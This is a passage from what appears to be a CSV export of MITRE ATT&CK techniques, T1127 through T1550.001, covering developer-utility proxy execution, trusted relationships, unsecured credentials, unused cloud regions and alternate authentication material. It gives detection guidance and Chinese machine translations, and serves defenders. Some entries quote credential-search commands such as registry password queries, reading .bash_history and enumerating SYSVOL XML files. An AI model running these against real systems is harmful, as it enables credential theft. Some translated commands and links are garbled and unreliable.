Use process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.",Windows,"Command: Command Execution, Process: Process Creation",False,,Application Control,"Casey Smith; Matthew Demaske, Adaptforward",,,,,,,",",利用可信开发工具代理执行,攻击者可能会利用受信任的开发人员实用程序来代理恶意负载的执行。有许多用于软件开发相关任务的实用程序，可用于执行各种形式的代码，以协助开发、调试和逆向工程。（引用：engima0x3 DNX 旁路）（引用：engima0x3 RCSI 旁路）（引用：利用星期一WinDbg）（引用：LOLBAS Tracker）这些实用程序通常可能使用合法证书进行签名，允许它们在系统上执行并通过有效绕过应用程序控制解决方案的受信任进程代理执行恶意代码。
T1127.001,Trusted Developer Utilities Proxy Execution: MSBuild,"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)

Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)",https://attack.mitre.org/techniques/T1127/001,27 March 2020,15 October 2021,1.2,Defense Evasion,Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.,Windows,"Command: Command Execution, Process: Process Creation",True,T1127,,"@ionstorm; Carrie Roberts, @OrOneEqualsOne",,,.NET Framework version 4 or higher,,,,"(Citation: Palo Alto PlugX June 2017),(Citation: Talos Frankenstein June 2019),(Citation: Github PowerShell Empire),(Citation: Microsoft WDAC)",受信任的开发人员实用程序代理执行：MSBuild,攻击者可能会使用 MSBuild 通过受信任的 Windows 实用程序来代理代码的执行。 MSBuild.exe (Microsoft Build Engine) 是 Visual Studio 使用的软件构建平台。它处理 XML 格式的项目文件，这些文件定义了加载和构建各种平台和配置的要求。（引用：MSDN MSBuild）攻击者可以滥用 MSBuild 来代理恶意代码的执行。 .NET 版本 4 中引入的 MSBuild 内联任务功能允许将 C# 或 Visual Basic 代码插入到 XML 项目文件中。（引用：MSDN MSBuild）（引用：Microsoft MSBuild Inline Tasks 2017）MSBuild 将编译并执行内联任务。 MSBuild.exe 是经过签名的 Microsoft 二进制文件，因此当以这种方式使用它时，它可以执行任意代码并绕过配置为允许执行 MSBuild.exe 的应用程序控制防御。（引用：LOLBAS Msbuild）
T1199,Trusted Relationship,"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.

Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)

In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",https://attack.mitre.org/techniques/T1199,18 April 2018,21 October 2022,2.3,Initial Access,"Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.","IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, Network Traffic: Network Traffic Content",False,,,"ExtraHop; Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Praetorian",,,,,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: MSTIC Nobelium Oct 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Microsoft POLONIUM June 2022),(Citation: Profero APT27 December 2020),(Citation: Symantec Cicada November 2020),(Citation: Secureworks REvil September 2019),(Citation: CrowdStrike StellarParticle January 2022),(Citation: DOJ APT10 Dec 2018),(Citation: FireEye APT10 April 2017),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Office 365 Partner Relationships),(Citation: Microsoft Nobelium Admin Privileges)",可信关系,对手可能会破坏或以其他方式利用可以接触到目标受害者的组织。通过受信任的第三方关系进行访问会滥用现有的连接，该连接可能不受保护或比获得网络访问的标准机制受到的审查更少。组织通常授予第二或第三方外部供应商更高的访问权限，以允许他们管理内部系统以及基于云的环境。这些关系的一些示例包括 IT 服务承包商、托管安全提供商、基础设施承包商（例如 HVAC、电梯、物理安全）。第三方提供商的访问可能仅限于所维护的基础设施，但可能与企业的其他部分存在于同一网络上。因此，另一方用于访问内部网络系统的[有效帐户](https://attack.mitre.org/techniques/T1078) 可能会被泄露和使用。（引用：CISA IT 服务提供商）在 Office 365 中环境中，组织可以授予 Microsoft 合作伙伴或经销商委派的管理员权限。通过破坏合作伙伴或经销商帐户，攻击者可能能够利用现有的委派管理员关系或向客户发送新的委派管理员优惠，以获得对受害租户的管理控制。（引用：Office 365 委派管理）
T1552,Unsecured Credentials,"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).",https://attack.mitre.org/techniques/T1552,04 February 2020,01 April 2022,1.2,Credential Access,"While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.

Monitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior.

Monitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like ""history"" instead of commands like <code>cat ~/.bash_history</code>.

Additionally, monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Command: Command Execution, File: File Access, Process: Process Creation, User Account: User Account Authentication, Windows Registry: Windows Registry Key Access",False,,,,"Administrator, SYSTEM, User",,,,,,"(Citation: Cybereason Astaroth Feb 2019),(Citation: MS14-025),(Citation: ADSecurity Finding Passwords in SYSVOL),(Citation: RedLock Instance Metadata API 2018),(Citation: Microsoft MS14-025)",不安全凭证,攻击者可能会搜索受感染的系统以查找并获取不安全存储的凭据。这些凭据可以存储和/或错放在系统上的许多位置，包括纯文本文件（例如 [Bash History](https://attack.mitre.org/techniques/T1552/003)）、操作系统或特定于应用程序存储库（例如[注册表中的凭据]（https://attack.mitre.org/techniques/T1552/002））或其他专用文件/工件（例如[私钥]（https://attack.mitre.org/技术/T1552/004))。
T1552.003,Unsecured Credentials: Bash History,"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",https://attack.mitre.org/techniques/T1552/003,04 February 2020,08 March 2022,1.1,Credential Access,"Monitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like ""history"" instead of commands like <code>cat ~/.bash_history</code>.","Linux, macOS","Command: Command Execution, File: File Access",True,T1552,,,User,,,,,,"(Citation: Aqua Kinsing April 2020),",不安全凭证：Bash 历史,攻击者可能会在受感染系统上搜索 bash 命令历史记录以查找不安全存储的凭据。 Bash 使用“历史”实用程序跟踪用户在命令行上键入的命令。一旦用户注销，历史记录就会刷新到用户的 <code>.bash_history</code> 文件中。对于每个用户，此文件位于同一位置：<code>~/.bash_history</code>。通常，此文件跟踪用户的最后 500 条命令。用户经常在命令行上键入用户名和密码作为程序的参数，然后在他们注销时将其保存到此文件中。攻击者可以通过查看文件以查找潜在凭据来滥用此功能。 （引用：DA 外部，OS X 方式）
T1552.005,Unsecured Credentials: Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.

Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)

If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.
",https://attack.mitre.org/techniques/T1552/005,11 February 2020,08 March 2022,1.3,Credential Access,"Monitor access to the Instance Metadata API and look for anomalous queries.

It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).",IaaS,User Account: User Account Authentication,True,T1552,,Praetorian,,,,,,,"(Citation: Cisco Talos Intelligence Group),(Citation: Trend Micro TeamTNT),(Citation: Peirates GitHub),(Citation: Unit 42 Hildegard Malware),(Citation: RedLock Instance Metadata API 2018),(Citation: Amazon AWS IMDS V2)",不安全凭证：云实例元数据 API,攻击者可能会尝试访问云实例元数据 API 以收集凭据和其他敏感数据。大多数云服务提供商都支持云实例元数据 API，该 API 是提供给正在运行的虚拟实例的服务，允许应用程序访问有关正在运行的虚拟实例的信息。可用信息通常包括名称、安全组和其他元数据，包括敏感数据，例如凭据和可能包含其他机密的 UserData 脚本。提供实例元数据 API 是为了方便管理应用程序，任何可以访问该实例的人都可以访问。（引文：AWS 实例元数据 API）云元数据 API 已被用于至少一个高调的妥协中。（引文: Krebs Capital One 2019 年 8 月）如果攻击者存在于正在运行的虚拟实例上，他们可以直接查询实例元数据 API 以识别授予对其他资源的访问权限的凭据。此外，攻击者可能会利用面向公众的 Web 代理中的服务器端请求伪造 (SSRF) 漏洞，使他们能够通过对实例元数据 API 的请求访问敏感信息。（引用：RedLock 实例元数据 API 2018）云服务提供商的事实上的标准是在 <code>http[:]//169.254.169.254</code> 上托管实例元数据 API。
T1552.007,Unsecured Credentials: Container API,"Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)

An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ",https://attack.mitre.org/techniques/T1552/007,31 March 2021,01 April 2022,1.1,Credential Access,"Establish centralized logging for the activity of container and Kubernetes cluster components. Monitor logs for actions that could be taken to gather credentials to container and cloud infrastructure, including the use of discovery API calls by new or unexpected users and APIs that access Docker logs.

It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).",Containers,"Command: Command Execution, File: File Access, User Account: User Account Authentication",True,T1552,,"Center for Threat-Informed Defense (CTID); Jay Chen, Palo Alto Networks; Yossi Weizman, Azure Defender Research Team","Administrator, User",,,,,,"(Citation: Peirates GitHub),(Citation: Kubernetes API Control Access),(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Hardening Guide)",不安全凭证：容器 API,攻击者可以通过容器环境中的 API 收集凭证。这些环境中的 API，例如 Docker API 和 Kubernetes API，允许用户远程管理他们的容器资源和集群组件。（引用：Docker API）（引用：Kubernetes API）攻击者可以访问 Docker API 来收集日志包含云、容器和环境中各种其他资源的凭据。（引用：Unit 42 Unsecured Docker Daemons）具有足够权限的攻击者，例如通过 pod 的服务帐户，也可以使用 Kubernetes API 从 Kubernetes 检索凭据API 服务器。这些凭据可能包括 Docker API 身份验证所需的凭据或来自 Kubernetes 集群组件的机密。
T1552.001,Unsecured Credentials: Credentials In Files,"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",https://attack.mitre.org/techniques/T1552/001,04 February 2020,12 April 2021,1.1,Credential Access,"While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.","Containers, IaaS, Linux, Windows, macOS","Command: Command Execution, File: File Access",True,T1552,,"Jay Chen, Palo Alto Networks; Microsoft Threat Intelligence Center (MSTIC); Rory McCune, Aqua Security; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","Administrator, SYSTEM, User",,Access to files,CAPEC-639,,,"(Citation: Talos Smoke Loader July 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Trend Micro TeamTNT),(Citation: Symantec Elfin Mar 2019),(Citation: Github PowerShell Empire),(Citation: CIS Emotet Dec 2018),(Citation: CrowdStrike Putter Panda),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: Unit 42 Playbook Dec 2017),(Citation: Symantec MuddyWater Dec 2018),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: GitHub QuasarRAT),(Citation: Symantec Buckeye),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Proofpoint TA505 Sep 2017),(Citation: TrendMicro Trickbot Feb 2019),(Citation: FireEye APT35 2018),(Citation: Volexity Patchwork June 2018),(Citation: FireEye APT33 Guardrail),(Citation: F-Secure BlackEnergy 2014),(Citation: GitHub LaZagne Dec 2018),(Citation: Invincea XTunnel),(Citation: AADInternals Documentation),(Citation: Securelist BlackEnergy Nov 2014),(Citation: GitHub PoshC2),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: CERT-FR PYSA April 2020),(Citation: Symantec Leafminer July 2018),(Citation: FireEye APT34 July 2019),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: US-CERT Emotet Jul 2018),(Citation: Cisco Talos Intelligence Group),(Citation: SentinelLabs Agent Tesla Aug 2020),",不安全凭证：文件中的凭证,攻击者可能会在本地文件系统和远程文件共享中搜索包含不安全存储凭据的文件。这些可以是用户创建的用于存储他们自己的凭据的文件、一组个人的共享凭据存储、包含系统或服务密码的配置文件或包含嵌入式密码的源代码/二进制文件。可以通过[OS Credential Dumping]（https://attack.mitre.org/techniques/T1003）从备份或保存的虚拟机中提取密码。 （引用：CG 2014）密码也可以从存储在 Windows 域控制器上的组策略首选项中获取。 （引用：SRD GPP）在云和/或容器化环境中，经过身份验证的用户和服务帐户凭据通常存储在本地配置和凭据文件中。（引用：Unit 42 Hildegard 恶意软件）它们也可以作为容器中部署命令的参数找到日志。（引用：Unit 42 Unsecured Docker Daemons）在某些情况下，这些文件可以复制并在另一台机器上重复使用，或者可以读取内容然后用于身份验证，而无需复制任何文件。（引用：Spectre Ops - Cloud凭证存储）
T1552.002,Unsecured Credentials: Credentials in Registry,"Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)

* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",https://attack.mitre.org/techniques/T1552/002,04 February 2020,07 February 2020,1.0,Credential Access,"Monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access",True,T1552,,"Sudhanshu Chauhan, @Sudhanshu_C","Administrator, User",,Ability to query some Registry locations depends on the adversary's level of access. User permissions are usually limited to access of user-related Registry keys.,,,,"(Citation: Pentestlab Stored Credentials),(Citation: SentinelOne Valak June 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Cybereason Oceanlotus May 2017),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: CrowdStrike IceApple May 2022),",不安全凭证：注册表中的凭证,攻击者可能会在受感染系统上的注册表中搜索不安全存储的凭据。 Windows 注册表存储系统或其他程序可以使用的配置信息。攻击者可能会查询注册表以查找已存储以供其他程序或服务使用的凭据和密码。有时这些凭据用于自动登录。查找与密码信息相关的注册表项的示例命令：（引用：Pentestlab Stored Credentials）* 本地机器 Hive：<code>reg query HKLM /f password /t REG_SZ /s</code> * 当前用户 Hive：<code>reg查询 HKCU /f 密码 /t REG_SZ /s</code>
T1552.006,Unsecured Credentials: Group Policy Preferences,"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)

These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>
* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>
",https://attack.mitre.org/techniques/T1552/006,11 February 2020,17 June 2020,1.0,Credential Access,"Monitor for attempts to access SYSVOL that involve searching for XML files. 

Deploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)",Windows,"Command: Command Execution, File: File Access",True,T1552,,,User,,,,,,"(Citation: PowerSploit Documentation),(Citation: FireEye APT33 Guardrail),(Citation: Symantec Elfin Mar 2019),(Citation: GitHub PowerSploit May 2012),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: MS14-025),(Citation: ADSecurity Finding Passwords in SYSVOL),(Citation: Microsoft MS14-025)",不安全凭证：组策略首选项,攻击者可能会尝试在组策略首选项 (GPP) 中找到不安全的凭据。 GPP 是允许管理员使用嵌入式凭据创建域策略的工具。这些策略允许管理员设置本地帐户。（引用：Microsoft GPP 2016）这些组策略存储在域控制器上的 SYSVOL 中。这意味着任何域用户都可以查看 SYSVOL 共享并解密密码（使用已公开的 AES 密钥）。（引用：Microsoft GPP 密钥）以下工具和脚本可用于从组策略偏好 XML 文件：* Metasploit 的后期利用模块：<code>post/windows/gather/credentials/gpp</code> * Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword) * gpprefdecrypt.py 在 SYSVOL 共享上，对手可以使用以下命令枚举潜在的 GPP XML 文件：<code>dir /s * .xml</code>
T1552.004,Unsecured Credentials: Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. 

Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.

Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)

Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.",https://attack.mitre.org/techniques/T1552/004,04 February 2020,29 March 2020,1.0,Credential Access,Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.,"Linux, Windows, macOS","Command: Command Execution, File: File Access",True,T1552,,"Itzik Kotler, SafeBreach",User,,,,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: Aqua Kinsing April 2020),(Citation: ESET Machete July 2019),(Citation: Adsecurity Mimikatz Guide),(Citation: Anomali Rocke March 2019),(Citation: Microsoft 365 Defender Solorigate),(Citation: Kaspersky Adwind Feb 2016),(Citation: ESET Ebury Feb 2014),(Citation: Trend Micro TeamTNT),(Citation: Github PowerShell Empire),(Citation: AADInternals Documentation),(Citation: FoxIT Wocao December 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: Unit 42 Hildegard Malware),",不安全凭证：私钥,攻击者可能会在受感染系统上搜索私钥证书文件以获取不安全存储的凭据。私钥和证书用于身份验证、加密/解密和数字签名。（引用：维基百科公钥加密）通用密钥和证书文件扩展名包括：.key、.pgp、.gpg、.ppk.、.p12、 .pem、.pfx、.cer、.p7b、.asc。攻击者也可能会在公共密钥目录中查找，例如基于 * nix 的系统上的 SSH 密钥的 <code>~/.ssh</code> 或 <code>C:&#92;Users&#92;(username)&# 92;.ssh&#92;</code> 在 Windows 上。这些私钥可用于向 SSH 等 [远程服务](https://attack.mitre.org/techniques/T1021) 进行身份验证，或用于解密其他收集的文件，例如电子邮件。已发现攻击者工具会在受感染系统中搜索与加密密钥和证书相关的文件扩展名。（引用：Kaspersky Careto）（引用：Palo Alto Prince of Persia）一些私钥需要密码或密码才能操作，因此攻击者也可能使用 [Input Capture](https://attack.mitre.org/techniques/T1056) 进行键盘记录或尝试 [Brute Force](https://attack.mitre.org/techniques/T1110) 离线密码。
T1535,Unused/Unsupported Cloud Regions,"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.

Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.

A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.

An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)",https://attack.mitre.org/techniques/T1535,04 September 2019,22 April 2021,1.1,Defense Evasion,Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold.(Citation: CloudSploit - Unused AWS Regions),IaaS,"Instance: Instance Creation, Instance: Instance Metadata",False,,,Netskope,User,,,,,,",(Citation: CloudSploit - Unused AWS Regions)",未使用/不支持的云区域,攻击者可能会在未使用的地理服务区域创建云实例以逃避检测。访问权限通常是通过破坏用于管理云基础设施的帐户来获得的。云服务提供商通常在全球范围内提供基础设施，以提高性能、提供冗余并让客户满足合规性要求。通常，客户只会使用可用区域的子集，可能不会主动监控其他区域。如果对手在未使用的区域中创建资源，他们可能会在不被发现的情况下进行操作。此行为的变体利用了跨云区域的功能差异。攻击者可以利用不支持高级检测服务的区域来避免检测到他们的活动。攻击者使用未使用的 AWS 区域的一个示例是通过 [Resource Hijacking](https://attack.mitre.org/techniques/T1496) 挖掘加密货币，这可能会随着时间的推移使组织花费大量金钱，具体取决于所使用的处理能力.（引用：CloudSploit - 未使用的 AWS 区域）
T1550,Use Alternate Authentication Material,"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. 

Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)

Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.
",https://attack.mitre.org/techniques/T1550,30 January 2020,01 April 2022,1.2,"Defense Evasion, Lateral Movement","Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","Containers, Google Workspace, IaaS, Office 365, SaaS, Windows","Active Directory: Active Directory Credential Request, Application Log: Application Log Content, Logon Session: Logon Session Creation, User Account: User Account Authentication, Web Credential: Web Credential Usage",False,,System Access Controls,,,,,,,,"(Citation: Secureworks IRON RITUAL Profile),(Citation: Microsoft 365 Defender Solorigate),(Citation: MSTIC FoggyWeb September 2021),",使用备用身份验证材料,攻击者可以使用替代身份验证材料，例如密码哈希、Kerberos 票证和应用程序访问令牌，以便在环境中横向移动并绕过正常的系统访问控制。身份验证过程通常需要有效身份（例如，用户名）以及一个或多个身份验证因素（例如，密码、pin、物理智能卡、令牌生成器等）。在用户或应用程序通过提供有效身份和所需的身份验证因素成功进行身份验证后，系统会合法地生成替代身份验证材料。在身份创建过程中也可能生成替代身份验证材料。（引用：NIST 身份验证）（引用：NIST MFA）缓存替代身份验证材料允许系统验证身份已成功通过身份验证，而无需要求用户重新输入身份验证因素.因为备用身份验证必须由系统维护——无论是在内存中还是在磁盘上——它可能有被 [Credential Access](https://attack.mitre.org/tactics/TA0006) 技术窃取的风险。通过窃取替代身份验证材料，攻击者能够绕过系统访问控制并在不知道明文密码或任何其他身份验证因素的情况下对系统进行身份验证。
T1550.001,Use Alternate Authentication Material: Application Access Token,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.

Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) 

In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)

